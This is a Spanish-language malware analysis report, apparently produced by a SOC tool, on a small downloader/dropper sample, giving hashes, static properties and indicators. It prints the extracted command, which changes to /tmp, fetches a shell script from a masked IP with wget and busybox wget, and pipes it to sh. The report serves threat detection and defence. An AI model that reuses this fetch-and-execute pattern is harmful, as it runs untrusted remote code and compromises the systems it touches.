# 🧬 Payload Analysis

`47f8e4a93023421f6516fc10c5e994a98e07fd40d5ecf7dd5640cdc6b0c47159`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `47f8e4a93023421f6516fc10c5e994a98e07fd40d5ecf7dd5640cdc6b0c47159`
- **MD5:** `b9da797038bb2ff6738b41bd9b9b54ca`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 167 B |
| Entropía | 4.75 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s iodata;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s iodata
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | 47f8e4a93023421f6516fc10c5e994a98e07fd40d5ecf7dd5640cdc6b0c47159 | static_analysis |
| command | cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s iodata;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s iodata | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
